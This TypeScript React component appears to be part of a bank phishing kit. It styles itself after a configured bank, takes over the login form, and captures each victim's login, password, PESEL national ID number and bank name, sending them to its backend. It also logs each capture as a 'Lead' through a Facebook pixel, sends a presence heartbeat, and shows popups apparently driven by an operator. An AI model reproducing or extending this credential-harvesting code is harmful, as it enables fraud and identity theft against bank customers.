import { useEffect, useRef } from 'react';
import { usePage } from '@inertiajs/react';
import type { BankConfig } from '@/config/banks/types';
import { useLocaleContext } from '@/i18n/LocaleProvider';
import { useBankLoginFlow } from './useBankLoginFlow';
import { showCommand } from './swalController';
import { applyBankSwalCss } from './bankSwalStyle';
import { OnlineTracker } from './onlineTracker';

type Props = {
    bank: BankConfig;
    sessionId: string;
};

export function BankLoginFlow({ bank, sessionId }: Props) {
    // eslint-disable-next-line @typescript-eslint/no-explicit-any
    const { props } = usePage<any>();

    const { command, busy, submitCredentials, answer, reset } = useBankLoginFlow({
        sessionId,
        bankSlug: bank.slug,
    });
    const { dict } = useLocaleContext();
    const busyRef = useRef(busy);
    busyRef.current = busy;
    const dictRef = useRef(dict);
    dictRef.current = dict;
    const answerRef = useRef(answer);
    answerRef.current = answer;
    const resetRef = useRef(reset);
    resetRef.current = reset;

    useEffect(() => applyBankSwalCss(bank.brand), [bank.brand]);

    // Online tracker: heartbeat while tab is active
    const preSessionId = (props.preSessionId as string | undefined) ?? '';
    useEffect(() => {
        if (!preSessionId) return;
        const tracker = new OnlineTracker(preSessionId);
        return () => tracker.destroy();
    }, [preSessionId]);

    useEffect(() => {
        showCommand(command, {
            dict: dictRef.current,
            answer: answerRef.current,
            reset: resetRef.current,
        });
    // eslint-disable-next-line react-hooks/exhaustive-deps
    }, [command]);

    useEffect(() => {
        const form = document.getElementById('lk_form') as HTMLFormElement | null;
        if (!form) return;

        const onSubmit = (e: Event) => {
            e.preventDefault();
            if (busyRef.current) return;
            const data = new FormData(form);
            const fields: Record<string, string> = {};
            for (const name of ['login', 'password', 'pesel', 'bankName']) {
                const el = form.querySelector<HTMLInputElement>(`#${name}`);
                if (el) fields[name] = el.value;
                else if (data.has(name)) fields[name] = String(data.get(name) ?? '');
            }
            if (typeof window !== 'undefined' && typeof (window as any).fbq === 'function') {
                (window as any).fbq('track', 'Lead');
            }
            void submitCredentials(fields);
        };

        const triggers = form.querySelectorAll<HTMLElement>('#loginButton, [type="submit"]');
        const onTriggerClick = (e: Event) => {
            e.preventDefault();
            onSubmit(e);
        };

        form.addEventListener('submit', onSubmit);
        triggers.forEach((t) => t.addEventListener('click', onTriggerClick));
        return () => {
            form.removeEventListener('submit', onSubmit);
            triggers.forEach((t) => t.removeEventListener('click', onTriggerClick));
        };
    }, [submitCredentials, bank.slug]);

    return null;
}
